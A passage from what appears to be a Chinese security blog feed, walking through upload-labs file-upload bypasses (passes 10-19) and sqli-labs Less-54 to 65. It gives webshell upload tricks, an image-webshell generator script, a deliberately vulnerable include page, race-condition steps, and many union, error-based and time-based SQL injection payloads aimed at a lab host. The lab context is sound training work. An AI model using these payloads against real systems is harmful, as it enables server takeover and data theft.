}}</code></pre><p>代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过strrchar函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过</p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = str_ireplace($deny_ext,"", $file_name);        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $file_name)) {            $img_path = $UPLOAD_ADDR . '/' .$file_name;            $is_upload = true;        }    } else {        $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';    }}</code></pre><p>黑名单过滤，将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过</p><p>.pphphp(这样解析后就变成.php)就上传成功</p><p>注：不能写成.phphpp,不然会被解析成.hpp</p><h3 id="0x12"><a href="#0x12" class="headerlink" title="#0x12"></a>#0x12</h3><h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11 00截断"></a>Pass-11 00截断</h2><pre><code>$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES['upload_file']['tmp_name'];        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        }        else{            $msg = '上传失败！';        }    }    else{        $msg = "只允许上传.jpg|.png|.gif类型文件！";    }}</code></pre><p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过</p><p>截断条件：<br> 1、php版本小于5.3.4<br> 2、php.ini的magic_quotes_gpc为OFF状态</p><p>这个%00截断其实和SQL注入里的注释作用是一样的让后面部分没有作用。</p><p>在save_path</p><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 00截断"></a>Pass-12 00截断</h2><pre><code>$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES['upload_file']['tmp_name'];        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        }        else{            $msg = "上传失败";        }    }    else{        $msg = "只允许上传.jpg|.png|.gif类型文件！";    }}</code></pre><p>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改</p><p><img src="/2021/02/23/uploadlabs/blog/source_posts\Uploadlabs\pass12.png" alt="pass12"></p><h2 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13 图片马绕过"></a>Pass-13 图片马绕过</h2><pre><code>function getReailFileType($filename){    $file = fopen($filename, "rb");    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack("C2chars", $bin);        $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);        $fileType = '';        switch($typeCode){              case 255216:                        $fileType = 'jpg';            break;        case 13780:                        $fileType = 'png';            break;                case 7173:                        $fileType = 'gif';            break;        default:                        $fileType = 'unknown';        }            return $fileType;}$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $temp_file = $_FILES['upload_file']['tmp_name'];    $file_type = getReailFileType($temp_file);    if($file_type == 'unknown'){        $msg = "文件未知，上传失败！";    }else{        $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").".".$file_type;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        }        else{            $msg = "上传失败";        }    }}</code></pre><p>读取上传文件中的两个字节</p><p>将读取的内容解包（unpack() 函数从二进制字符串对数据进行解包返回数组一个字节为一个值）</p><p>返回解包后的整数值（<strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值）</p><h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><p>我们在一句话木马的开头添加两个11也就是二进制的3131，将<code>HEX</code>编码 3131 改为 FFD8 点<code>Go</code>后成功上传<code>JPG</code></p><h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><p>利用图片马，将一张正常的图片jpg，和一句话php合成一张新的jpg文件，window下 cmd</p><pre><code>copy 1.jpg /b + 1.php /a shell.jpg</code></pre><p>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p><pre><code>##include.php&lt;?php/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/header("Content-Type:text/html;charset=utf-8");$file = $_GET['file'];if(isset($file)){    include $file;}else{    show_source(__file__);}?&gt;</code></pre><h2 id="Pass-14-getimagesize-图片马"><a href="#Pass-14-getimagesize-图片马" class="headerlink" title="Pass-14 getimagesize()-图片马"></a>Pass-14 getimagesize()-图片马</h2><pre><code>function isImage($filename){    $types = '.jpeg|.png|.gif';    if(file_exists($filename)){        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);        if(stripos($types,$ext)&gt;=0){            return $ext;        }else{            return false;        }    }else{        return false;    }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $temp_file = $_FILES['upload_file']['tmp_name'];    $res = isImage($temp_file);    if(!$res){        $msg = "文件未知，上传失败！";    }else{        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = "上传出错！";        }    }}</code></pre><p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13</p><h4 id="getmagicsize"><a href="#getmagicsize" class="headerlink" title="#getmagicsize()"></a>#getmagicsize()</h4><p>用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><pre><code>Array(    [0] =&gt; 290    [1] =&gt; 69    [2] =&gt; 3    [3] =&gt; width="290" height="69"    [bits] =&gt; 8    [mime] =&gt; image/png)</code></pre><ul><li><p>索引 0 给出的是图像宽度的像素值</p></li><li><p>索引 1 给出的是图像高度的像素值</p></li><li><p>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 =  BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</p></li><li><p>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image标签</p></li><li><p>索引 bits 给出的是图像的每种颜色的位数，二进制格式</p></li><li><p>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</p></li><li><p>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</p><h4 id="magic-type-to-extesion"><a href="#magic-type-to-extesion" class="headerlink" title="#magic_type_to_extesion()"></a>#magic_type_to_extesion()</h4><p>根据指定的图像类型返回对应的后缀名</p></li></ul><h2 id="Pass-15-exif-imagetype-图片马"><a href="#Pass-15-exif-imagetype-图片马" class="headerlink" title="Pass-15 exif_imagetype()-图片马"></a>Pass-15 exif_imagetype()-图片马</h2><pre><code>function isImage($filename){    //需要开启php_exif模块    $image_type = exif_imagetype($filename);    switch ($image_type) {        case IMAGETYPE_GIF:            return "gif";            break;        case IMAGETYPE_JPEG:            return "jpg";            break;        case IMAGETYPE_PNG:            return "png";            break;            default:            return false;            break;    }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $temp_file = $_FILES['upload_file']['tmp_name'];    $res = isImage($temp_file);    if(!$res){        $msg = "文件未知，上传失败！";    }else{        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = "上传出错！";        }    }}</code></pre><p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13</p><p>#exif_magictype()</p><p>读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。</p><p>注：需打开php_exif 模块，把前面的分号去掉就打开了。</p><h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16 二次渲染绕过"></a>Pass-16 二次渲染绕过</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])){    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename = $_FILES['upload_file']['name'];    $filetype = $_FILES['upload_file']['type'];    $tmpname = $_FILES['upload_file']['tmp_name'];    $target_path=UPLOAD_PATH.'/'.basename($filename);    // 获得上传文件的扩展名    $fileext= substr(strrchr($filename,"."),1);    //判断文件后缀与类型，合法才进行上传操作    if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg")){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefromjpeg($target_path);            if($im == false){                $msg = "该文件不是jpg格式的图片！";                @unlink($target_path);            }else{                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).".jpg";                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.'/'.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = "上传出错！";        }    }else if(($fileext == "png") &amp;&amp; ($filetype=="image/png")){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefrompng($target_path);            if($im == false){                $msg = "该文件不是png格式的图片！";                @unlink($target_path);            }else{                 //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).".png";                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.'/'.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = true;                           }        } else {            $msg = "上传出错！";        }    }else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif")){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefromgif($target_path);            if($im == false){                $msg = "该文件不是gif格式的图片！";                @unlink($target_path);            }else{                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).".gif";                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.'/'.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = "上传出错！";        }    }else{        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";    }}</code></pre><h4 id="basename-path-suffix"><a href="#basename-path-suffix" class="headerlink" title="#basename(path,suffix)"></a>#basename(path,suffix)</h4><p>函数返回路径中的文件名部分。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要检查的路径。</td></tr><tr><td>suffix</td><td>可选。规定文件扩展名。如果文件有名有文件扩展名，将不会显示这个扩展名。</td></tr></tbody></table><p>#imagecreatefrom__()</p><p>该系列函数用于从文件或 URL 载入一幅图像，返回一图像标识符，代表了从给定的文件名取得的图像。失败返回 false。</p><p>注：程序通过imagecreatefromjpeg()函数调用了PHP GD库（GD库，是php处理图形的扩展库），对图片进行了转换。</p><p>该系列函数有：</p><p>imagecreatefromgif()：      创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：   创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：    创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br>imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像<br>imagecreatefromstring()： 创建一块画布，并从字符串中的图像流新建一副图像</p><h4 id="unlink-filename-context"><a href="#unlink-filename-context" class="headerlink" title="#unlink(filename,context)"></a>#unlink(filename,context)</h4><p>删除文件。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>必需。规定要删除的文件。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td></tr></tbody></table><p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p><h4 id="srand-seed"><a href="#srand-seed" class="headerlink" title="#srand(seed)"></a>#srand(seed)</h4><p>播下随机数发生器种子。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>seed</td><td>可选。用 seed 播下随机数发生器种子。</td></tr></tbody></table><p>自 PHP 4.2.0 起，不再需要用 srand() 或 <a href="https://www.w3school.com.cn/php/func_math_mt_srand.asp">mt_srand()</a> 函数给随机数发生器播种，现在已自动完成。所以这个函数现在来说应该没用。</p><h4 id="strval-mixed-var"><a href="#strval-mixed-var" class="headerlink" title="#strval( mixed $var)"></a>#strval( mixed $var)</h4><p>用于获取变量的字符串值。</p><p>$var: 可以是任何标量类型，但不能是数组或对象。</p><h4 id="image"><a href="#image" class="headerlink" title="#image__()"></a>#image__()</h4><p>将图像输出到浏览器或文件。</p><p>imagegif()：       以 GIF 格式将图像输出到浏览器或文件<br>imagejpeg()：    以 JPEG 格式将图像输出到浏览器或文件<br>imagepng()：     以 PNG 格式将图像输出到浏览器或文件<br>imagewbmp()：以 WBMP 格式将图像输出到浏览器或文件</p><pre><code>&lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, ​          0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, ​          0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, ​          0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, ​          0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, ​          0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, ​          0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, ​          0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) &amp;#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color); &amp;#125;   imagepng($img,'./fox.png');   ?&gt;</code></pre><pre><code> php pass17.php pass17.png</code></pre><p>这个一句话木马需要同时传参GET参数0和POST参数1才行</p><p>用菜刀连接file=./upload/1234.png&amp;0=assert  密码是1 就可以了</p><p>#这里不能用eval函数 </p><p>#只有php.ini中开启short_open_tag 才可以用&lt;?  代替 &lt;?php  , 用&lt;?= 代替 &lt;? echo</p><p>#在PHP7.1版本以后，assert()默认不再可以执行代码 就像eval一样。所以说 assert也和eval一样不能被可变函数调用。</p><p>这关不会</p><p><a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h2><pre><code>$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_name = $_FILES['upload_file']['name'];    $temp_file = $_FILES['upload_file']['tmp_name'];    $file_ext = substr($file_name,strrpos($file_name,".")+1);    $upload_file = UPLOAD_PATH . '/' . $file_name;    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = "只允许上传.jpg|.png|.gif类型文件！";            unlink($upload_file);        }    }else{        $msg = '上传出错！';    }}</code></pre><p>这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可</p><h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h2><pre><code>//index.php$is_upload = false;$msg = null;if (isset($_POST['submit'])){    require_once("./myupload.php");    $imgFileName =time();    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);    $status_code = $u-&gt;upload(UPLOAD_PATH);    switch ($status_code) {        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = '文件已经被上传，但没有重命名。';            break;         case -1:            $msg = '这个文件不能上传到服务器的临时文件存储目录。';            break;         case -2:            $msg = '上传失败，上传目录不可写。';            break;         case -3:            $msg = '上传失败，无法上传该类型文件。';            break;         case -4:            $msg = '上传失败，上传的文件过大。';            break;         case -5:            $msg = '上传失败，服务器已经存在相同名称文件。';            break;         case -6:            $msg = '文件无法上传，文件不能复制到目标目录。';            break;              default:            $msg = '未知错误！';            break;    }}//myupload.phpclass MyUpload{..................   var $cls_arr_ext_accepted = array(      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",      ".html", ".xml", ".tiff", ".jpeg", ".png" );..................    /** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/  function upload( $dir ){    $ret = $this-&gt;isUploadedFile();    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );    }    $ret = $this-&gt;setDir( $dir );    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );    }    $ret = $this-&gt;checkExtension();    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );    }    $ret = $this-&gt;checkSize();    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );        }    // if flag to check if the file exists is set to 1    if( $this-&gt;cls_file_exists == 1 ){      $ret = $this-&gt;checkFileExists();      if( $ret != 1 ){        return $this-&gt;resultUpload( $ret );          }    }    // if we are here, we are ready to move the file to destination    $ret = $this-&gt;move();    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );        }    // check if we need to rename the file    if( $this-&gt;cls_rename_file == 1 ){      $ret = $this-&gt;renameFile();      if( $ret != 1 ){        return $this-&gt;resultUpload( $ret );          }    }    // if we are here, everything worked as planned :)    return $this-&gt;resultUpload( "SUCCESS" );  }.................. };</code></pre><p>也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p><p>使用上一关的木马文件，白名单中允许后缀为7z的文件上传</p><p>我们可以构造1.php.7z文件，在Apache中允许多后缀，并且从右向左解析</p><p>当我们访问1.php.7z解析成php文件，根据文件代码生成shell.php</p><h2 id="Pass-19-00截断"><a href="#Pass-19-00截断" class="headerlink" title="Pass-19 00截断"></a>Pass-19 00截断</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");        $file_name = $_POST['save_name'];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) {            $temp_file = $_FILES['upload_file']['tmp_name'];            $img_path = UPLOAD_PATH . '/' .$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                 $is_upload = true;            }else{                $msg = '上传出错！';            }        }else{            $msg = '禁止保存为该类型文件！';        }    } else {        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';    }}</code></pre><p>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-54-65:challenges-有限机会的注入11</title>
      <link href="2021/02/16/sql-sqlilabs-less-54-65-challenges-you-xian-ji-hui-de-zhu-ru/"/>
      <url>2021/02/16/sql-sqlilabs-less-54-65-challenges-you-xian-ji-hui-de-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-54-10次机会"><a href="#Less-54-10次机会" class="headerlink" title="Less-54 10次机会"></a>Less-54 10次机会</h2><p>源码最后注掉了错误提示，可以看到用了很多随机值做拼接，next_tryy();这个函数比较亮眼，查看challenges数据库，发现字段tryy，就代表着时间，随意修改时间次数</p><pre><code>&lt;?phpinclude '../sql-connections/sql-connect-1.php';include '../sql-connections/functions.php';$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; $times= 10;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column nameif(!isset($_POST['answer_key'])){    if(isset($_POST['reset'])){        setcookie('challenge', ' ', time() - 3600000);}    else{        if(isset($_COOKIE['challenge'])){            $sessid=$_COOKIE['challenge'];}        else{            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie("challenge", $hash, $expire);}        if(isset($_GET['id'])){            $id=$_GET['id'];            next_tryy();            $tryyy = view_attempts();                        if($tryyy &gt;= ($times+1)){                setcookie('challenge', ' ', time() - 3600000);}                $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            }}}&lt;?php}else{    $key = addslashes($_POST['key']);    $key = mysql_real_escape_string($key);    $sql="SELECT 1 FROM $table WHERE $col1= '$key'";    if($row){}else {//print_r(mysql_error());}}?&gt;</code></pre><h5 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h5><pre><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+</code></pre><p>zpmxcs1wwi</p><pre><code>?id=-1' union all select 1,group_concat(column_name),3 from information_schema.columns where table_name='zpmxcs1wwi'--+</code></pre><p>Your Login name:id,sessid,secret_59AZ,tryy<br>Your Password:3</p><pre><code>?id=-1' union select 1,2,(group_concat( concat_ws(0x7e,sessid,secret_59AZ,tryy))) from challenges.zpmxcs1wwi--+</code></pre><pre><code>?id=-1' union select 1,2,group_concat(secret_59AZ) from challenges.hcuhv04r8w--+</code></pre><p>Your Login name:2<br>Your Password:fbf50efd552a22190e4e76d28f87b072<del>0EUPSlL2MhoICNxHUeX4D4jI</del>3 </p><h2 id="Less-55-14次机会"><a href="#Less-55-14次机会" class="headerlink" title="Less-55 14次机会"></a>Less-55 14次机会</h2><p>闭合方式为单括号，剩下的都和五十四关一样</p><pre><code>?id=1) or sleep(5)--+</code></pre><h2 id="Less-56-14次机会"><a href="#Less-56-14次机会" class="headerlink" title="Less-56 14次机会"></a>Less-56 14次机会</h2><p>闭合方式为单引号括号，剩下的都和五十四关一样</p><pre><code>?id=1') or sleep(5)--+</code></pre><h2 id="Less-57-14次机会"><a href="#Less-57-14次机会" class="headerlink" title="Less-57 14次机会"></a>Less-57 14次机会</h2><p>闭合方式为双引号，剩下的都和五十四关一样</p><pre><code>?id=1" or sleep(5)--+</code></pre><h2 id="Less-58-5次机会"><a href="#Less-58-5次机会" class="headerlink" title="Less-58 5次机会"></a>Less-58 5次机会</h2><p>union被禁用（所以只能用报错注入）</p><pre><code>?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')))--+</code></pre><p>或者</p><pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES')),1)--+</code></pre><p>p4fa6u9121</p><pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='p4fa6u9121' )),1)--+</code></pre><p>‘~id,sessid,secret_UFUT,tryy’</p><pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_UFUT) from challenges.p4fa6u9121)),1)--+</code></pre><h2 id="Less-59-5次机会"><a href="#Less-59-5次机会" class="headerlink" title="Less-59 5次机会"></a>Less-59 5次机会</h2><pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES')),1)--+</code></pre><p>~s58vuqfkcd</p><pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='s58vuqfkcd' )),1)--+</code></pre><p>~id,sessid,secret_SK4I,tryy</p><pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_SK4I) from challenges.s58vuqfkcd)),1)--+</code></pre><p>~a62dnjQ7GwyliNtIWBjX6g1i</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>与Less-58大体一致</p><p>闭合方式为双引号括号</p><pre><code>?id=1") or sleep(5)--+</code></pre><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>与Less-58大体一致</p><p>闭合方式为双括号单引号’))</p><pre><code>?id=1')) or sleep(5)--+</code></pre><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>字段名表名动态的，没法用报错注入，就只能用布尔盲注了</p><p>数据库名，使用二分法，不断改变if中第一部分的判断条件，先判断出数据库的长度</p><pre><code>?id=1') and if(length(database())&gt;9 , sleep(3), 1) --+</code></pre><pre><code>?id=1’) and if(length(database())=10,1,sleep(5))–+</code></pre><pre><code>第一位字符http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),1,1)='c',sleep(5),1)--+第一位字符ascii码（当然不可能一上来就看出来是99，先要和很多数字进行二分大于小于的比较，慢慢确定范围，这里更建议用ascii码）http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),1,1))=99,sleep(5),1)--+ascii码payloadhttp://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),2,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),3,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),4,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),5,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),6,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),7,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),8,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),9,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),10,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))=52,sleep(5),1)--+字符payloadhttp://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),2,1)='h',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),3,1)='a',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),4,1)='l',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),5,1)='l',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),6,1)='e',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),7,1)='n',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),8,1)='g',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),9,1)='e',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),10,1)='s',sleep(5),1)--+表个数http://192.168.239.138:86/Less-62/index.php/?id=1') and if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 1,sleep(5),1)--+第一张表长度http://192.168.239.138:86/Less-62/index.php/?id=1') and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=10,sleep(5),1)--+表的每一位http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))&gt;15,sleep(5),1)--+</code></pre><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>闭合方式为单引号’</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>闭合方式为双括号))</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>闭合方式为双引号小括号”)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:闭合方式的判断</title>
      <link href="2021/02/15/sql-bi-he-fang-shi-de-pan-duan/"/>
      <url>2021/02/15/sql-bi-he-fang-shi-de-pan-duan/</url>
      
